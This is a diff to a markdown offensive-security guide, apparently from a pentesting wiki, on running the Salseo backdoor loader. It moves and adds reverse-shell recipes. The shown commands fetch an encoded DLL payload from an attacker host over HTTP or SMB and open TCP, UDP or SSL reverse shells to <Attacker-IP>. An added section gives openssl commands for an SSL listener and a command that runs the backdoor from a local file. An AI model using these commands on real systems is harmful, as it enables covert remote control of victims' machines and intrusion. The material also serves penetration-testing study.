@@ -175,15 +175,24 @@ Remember to start a nc as the reverse shell listener, and a HTTP server to serve
 
 `SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>`
 
-### Getting a TCP reverse shell SSL (downloading encoded dll through HTTP)
-
-`SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt ReverseSSL <Attacker-IP> <Port>`
-
 ### Getting a UDP reverse shell (downloading encoded dll through SMB)
 
 Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).
 
 `SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>`
+
+### Getting a TCP reverse shell SSL (using local file)
+
+**Set the listener inside the attacker machine:**
+
+```
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -key key.pem -cert cert.pem -port <port> -tls1
+```
+**Execute the backdoor:**
+```
+SalseoLoader.exe password C:/path/to/evilsalsa.dll.txt ReverseSSL <Attacker-IP> <Port>
+```
 
 ### Getting a ICMP reverse shell (encoded dll already inside the victim)
 
